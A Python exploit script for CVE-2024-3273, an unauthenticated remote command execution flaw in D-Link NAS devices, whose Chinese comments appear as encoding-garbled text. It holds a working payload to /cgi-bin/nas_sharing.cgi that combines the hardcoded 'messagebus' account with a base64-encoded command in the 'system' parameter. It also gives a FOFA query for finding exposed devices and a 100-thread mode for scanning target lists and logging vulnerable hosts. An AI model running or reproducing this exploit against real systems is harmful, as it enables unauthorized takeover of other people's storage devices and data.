#D-Link NAS nas_sharing.cgiÊé•Âè£Â≠òÂú®ÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåËØ•ÊºèÊ¥ûÂ≠òÂú®‰∫é‚Äú/cgi-bin/nas_sharing.cgi‚ÄùËÑöÊú¨‰∏≠ÔºåÂΩ±ÂìçÂÖ∂ HTTP GET ËØ∑Ê±ÇÂ§ÑÁêÜÁ®ãÂ∫èÁªÑ‰ª∂„ÄÇÊºèÊ¥ûÊàêÂõ†ÊòØÈÄöËøáÁ°¨ÁºñÁ†ÅÂ∏êÊà∑ÔºàÁî®Êà∑ÂêçÔºö‚Äúmessagebus‚ÄùÂíåÁ©∫ÂØÜÁ†ÅÔºâÈÄ†ÊàêÁöÑÂêéÈó®‰ª•ÂèäÈÄöËøá‚Äúsystem‚ÄùÂèÇÊï∞ÁöÑÂëΩ‰ª§Ê≥®ÂÖ•ÈóÆÈ¢ò„ÄÇÊú™ÁªèË∫´‰ªΩÈ™åËØÅÁöÑÊîªÂáªËÄÖÂèØÂà©Áî®Ê≠§ÊºèÊ¥ûËé∑ÂèñÊúçÂä°Âô®ÊùÉÈôê„ÄÇ
#fofa:"Text:In order to access the ShareCenter, please make sure you are using a recent browser(IE 7+, Firefox 3+, Safari 4+, Chrome 3+, Opera 10+)"
#id>>aWQ=(base64ÁºñÁ†Å) D-LinkNAS_nassharing_RCE.py

import requests,re,argparse,sys,time,os
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()# Ëß£Èô§Ë≠¶Âëä
from colorama import Fore, Style
BLUE = Fore.BLUE
RESET = Style.RESET_ALL
def banner():
    banner ="""

 ‚ñÑ‚ñÑ‚ñÑ     ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì ‚ñÑ‚ñÑ‚ñÑ       ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñÑ   ‚ñà‚ñà ‚ñÑ‚ñà‚ñÄ    ‚ñà‚ñà‚ñà‚ñÑ    ‚ñà  ‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà     ‚ñà‚ñë ‚ñê‚ñà‚ñà‚ñå 
‚ñí‚ñà‚ñà‚ñà‚ñà‚ñÑ   ‚ñì  ‚ñà‚ñà‚ñí ‚ñì‚ñí‚ñì  ‚ñà‚ñà‚ñí ‚ñì‚ñí‚ñí‚ñà‚ñà‚ñà‚ñà‚ñÑ    ‚ñí‚ñà‚ñà‚ñÄ ‚ñÄ‚ñà   ‚ñà‚ñà‚ñÑ‚ñà‚ñí     ‚ñà‚ñà ‚ñÄ‚ñà   ‚ñà ‚ñí‚ñà‚ñà‚ñí  ‚ñà‚ñà‚ñí‚ñì‚ñà‚ñë ‚ñà ‚ñë‚ñà‚ñë ‚ñê‚ñà‚ñà‚ñå 
‚ñí‚ñà‚ñà  ‚ñÄ‚ñà‚ñÑ ‚ñí ‚ñì‚ñà‚ñà‚ñë ‚ñí‚ñë‚ñí ‚ñì‚ñà‚ñà‚ñë ‚ñí‚ñë‚ñí‚ñà‚ñà  ‚ñÄ‚ñà‚ñÑ  ‚ñí‚ñì‚ñà    ‚ñÑ ‚ñì‚ñà‚ñà‚ñà‚ñÑ‚ñë    ‚ñì‚ñà‚ñà  ‚ñÄ‚ñà ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñë  ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñë ‚ñà ‚ñë‚ñà  ‚ñê‚ñà‚ñà‚ñå 
‚ñë‚ñà‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà‚ñë ‚ñì‚ñà‚ñà‚ñì ‚ñë ‚ñë ‚ñì‚ñà‚ñà‚ñì ‚ñë ‚ñë‚ñà‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà ‚ñí‚ñì‚ñì‚ñÑ ‚ñÑ‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà ‚ñà‚ñÑ    ‚ñì‚ñà‚ñà‚ñí  ‚ñê‚ñå‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà   ‚ñà‚ñà‚ñë‚ñë‚ñà‚ñë ‚ñà ‚ñë‚ñà  ‚ñì‚ñà‚ñà‚ñí 
 ‚ñì‚ñà   ‚ñì‚ñà‚ñà‚ñí ‚ñí‚ñà‚ñà‚ñí ‚ñë   ‚ñí‚ñà‚ñà‚ñí ‚ñë  ‚ñì‚ñà   ‚ñì‚ñà‚ñà‚ñí‚ñí ‚ñì‚ñà‚ñà‚ñà‚ñÄ ‚ñë‚ñí‚ñà‚ñà‚ñí ‚ñà‚ñÑ   ‚ñí‚ñà‚ñà‚ñë   ‚ñì‚ñà‚ñà‚ñë‚ñë ‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë‚ñë‚ñë‚ñà‚ñà‚ñí‚ñà‚ñà‚ñì  ‚ñí‚ñÑ‚ñÑ  
 ‚ñí‚ñí   ‚ñì‚ñí‚ñà‚ñë ‚ñí ‚ñë‚ñë     ‚ñí ‚ñë‚ñë    ‚ñí‚ñí   ‚ñì‚ñí‚ñà‚ñë‚ñë ‚ñë‚ñí ‚ñí  ‚ñë‚ñí ‚ñí‚ñí ‚ñì‚ñí   ‚ñë ‚ñí‚ñë   ‚ñí ‚ñí ‚ñë ‚ñí‚ñë‚ñí‚ñë‚ñí‚ñë ‚ñë ‚ñì‚ñë‚ñí ‚ñí   ‚ñë‚ñÄ‚ñÄ‚ñí 
  ‚ñí   ‚ñí‚ñí ‚ñë   ‚ñë        ‚ñë      ‚ñí   ‚ñí‚ñí ‚ñë  ‚ñë  ‚ñí   ‚ñë ‚ñë‚ñí ‚ñí‚ñë   ‚ñë ‚ñë‚ñë   ‚ñë ‚ñí‚ñë  ‚ñë ‚ñí ‚ñí‚ñë   ‚ñí ‚ñë ‚ñë   ‚ñë  ‚ñë 
  ‚ñë   ‚ñí    ‚ñë        ‚ñë        ‚ñë   ‚ñí   ‚ñë        ‚ñë ‚ñë‚ñë ‚ñë       ‚ñë   ‚ñë ‚ñë ‚ñë ‚ñë ‚ñë ‚ñí    ‚ñë   ‚ñë      ‚ñë 
      ‚ñë  ‚ñë                       ‚ñë  ‚ñë‚ñë ‚ñë      ‚ñë  ‚ñë               ‚ñë     ‚ñë ‚ñë      ‚ñë     ‚ñë    
                                    author:           üêñsawaüêá
                                    version:          1.0.0
                                    For:              D-Link NAS Êú™ÊéàÊùÉRCEÊºèÊ¥û
                                    Vulnerability ID: CVE-2024-3273               ‚ñë                                                     
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description="this is a D-Link NAS Êú™ÊéàÊùÉRCEÊºèÊ¥û")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','-file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")# print("Usage:\n\t python3 {} -h".format(sys.argv[0]))

def poc(target):
    payload_url = '/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ='
    url = target+payload_url
    headers = {
        'User-Agent':'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)',
        'Accept-Encoding':'identity',
        'Accept': '*/*',
        'Connection':'keep-alive',
        }
    try:
        res = requests.get(url=url,headers=headers,verify=False,timeout=5)
        if res.status_code == 200 and 'root' in res.text:
            print(f"{BLUE}[+]ËØ•{target}Â≠òÂú®ÊºèÊ¥û{RESET}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")
                return True
        else:
            print(f"[-]ËØ•{target}‰∏çÂ≠òÂú®ÊºèÊ¥û")
            return False
    except Exception as e:
        print(f"[*]ËØ•urlÂ≠òÂú®ÈóÆÈ¢ò{target}"+str(e))
        return False

if __name__ == '__main__':
    main()




















